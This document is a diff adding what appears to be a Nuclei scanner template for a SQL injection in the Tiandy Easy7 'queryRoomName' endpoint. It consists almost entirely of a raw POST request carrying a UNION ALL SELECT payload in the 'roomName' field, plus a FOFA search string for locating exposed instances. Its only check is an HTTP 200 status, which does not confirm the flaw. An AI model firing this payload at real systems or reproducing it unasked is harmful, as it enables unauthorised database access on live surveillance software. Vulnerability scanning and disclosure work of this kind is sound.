@@ -1,0 +1,36 @@
+id: poc-iyb05r1wrch4yru7
+info:
+  name: 天地伟业Easy7 queryRoomName存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iyb05r1wrch4yru7'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iyb05r1wrch4yru7
+    fofa: app="Tiandy-Easy7"
+http:
+- raw:
+  - 'POST /Easy7/rest/inquestRoom/queryRoomName HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    roomName='' UNION ALL SELECT CONCAT(0x7178766b71,0x4f4c5062456650564865766e6d4c6f4d6a535674627748485466576b7a4a46427370624e6145556f,0x716a6a6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
